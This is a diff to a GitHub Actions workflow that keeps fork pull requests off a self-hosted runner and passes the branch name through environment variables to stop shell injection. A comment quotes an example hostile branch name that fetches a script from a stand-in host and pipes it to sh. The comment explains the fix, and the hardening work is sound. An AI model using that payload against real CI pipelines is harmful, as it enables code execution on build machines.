@@ -70,8 +70,23 @@ jobs:
   # Human PR: security/scanning jobs only — build & smoke-test are deferred
   #   to the push-to-main run right after merge.
   # push to main (post-merge, from any source): run everything.
+  #
+  # Fork PR: nothing. Every job here runs on the self-hosted runner, and
+  #   several of them execute code from the branch (npm ci with lifecycle
+  #   scripts, CodeQL autobuild, vite.config.ts). A pull request from a fork
+  #   must never reach that machine — the job-level `if` below keeps the gate
+  #   from being scheduled at all, and every other job needs the gate, so
+  #   they are skipped with it. Maintainers re-push a reviewed fork branch to
+  #   this repository to get it scanned.
+  #
+  # The branch name (github.head_ref) is chosen by whoever opens the pull
+  # request. It is passed through `env` and never interpolated into the
+  # script: `${{ github.head_ref }}` inside `run:` is pasted into the shell
+  # source before bash parses it, so a branch called e.g.
+  # `x";{curl,-sSfL,evil.example}|sh;"` was command execution on the runner.
   gate:
     name: Determine which sections run
+    if: github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository
     runs-on: self-hosted
     timeout-minutes: 45
     outputs:
@@ -80,12 +95,15 @@ jobs:
       run_audit: ${{ steps.decide.outputs.run_audit }}
     steps:
       - id: decide
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          HEAD_REF: ${{ github.head_ref }}
         run: |
-          if [[ "${{ github.event_name }}" == "push" ]]; then
+          if [[ "$EVENT_NAME" == "push" ]]; then
             echo "run_security=true" >> "$GITHUB_OUTPUT"
             echo "run_build=true" >> "$GITHUB_OUTPUT"
             echo "run_audit=true" >> "$GITHUB_OUTPUT"
-          elif [[ "${{ github.head_ref }}" == dependabot/* ]]; then
+          elif [[ "$HEAD_REF" == dependabot/* ]]; then
             echo "run_security=false" >> "$GITHUB_OUTPUT"
             echo "run_build=true" >> "$GITHUB_OUTPUT"
             echo "run_audit=true" >> "$GITHUB_OUTPUT"
@@ -229,6 +247,7 @@ jobs:
           node scripts/test-nis2-applicability.js
           node scripts/test-nis2-self-check.js
           node scripts/test-nis2-scoring-model.js
+          node scripts/test-security-review-2026-11.js
         working-directory: .
         env:
           JWT_SECRET: ci-dummy-secret-for-checks-only
